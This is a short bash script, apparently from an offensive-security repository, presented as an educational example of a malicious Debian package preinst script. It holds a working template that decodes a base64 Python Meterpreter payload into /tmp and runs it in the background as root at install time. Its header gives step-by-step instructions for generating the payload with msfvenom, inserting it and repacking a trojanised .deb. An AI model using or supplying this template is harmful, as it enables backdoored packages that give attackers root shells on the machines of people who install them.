#!/bin/bash
# =============================================================================
# example-preinst.sh — Example of a malicious .deb preinst script
# =============================================================================
#
# PURPOSE (EDUCATIONAL ONLY):
#   This file shows what a malicious Debian package maintainer script
#   (preinst) looks like when weaponized with a reverse shell payload.
#
#   In a real .deb package, this file lives at:
#       DEBIAN/preinst
#   and is executed by dpkg AS ROOT before the package is installed.
#
# DISCLAIMER:
#   This is a REFERENCE ONLY. Do not use against systems you do not own
#   or have explicit written authorization to test.
#   See ../DISCLAIMER.md for the full legal notice.
#
# HOW TO USE:
#   1. Generate your payload with msfvenom (see docs/USAGE.md Step 2)
#   2. Base64-encode it: base64 -w 0 payload.py > payload.b64
#   3. Replace BASE64_ENCODED_PAYLOAD_HERE with the output of payload.b64
#   4. Copy this file to extracted_folder/DEBIAN/preinst
#   5. Make it executable: chmod 755 extracted_folder/DEBIAN/preinst
#   6. Repack the .deb: dpkg-deb -b extracted_folder/ new_malicious.deb
# =============================================================================

# Decode the Base64-encoded Python Meterpreter payload and write it to /tmp
echo "BASE64_ENCODED_PAYLOAD_HERE" | base64 -d > /tmp/payload.py

# Execute the payload in the background so dpkg does not hang
python3 /tmp/payload.py &

# Exit cleanly so dpkg proceeds (payload is already running in background)
exit 0
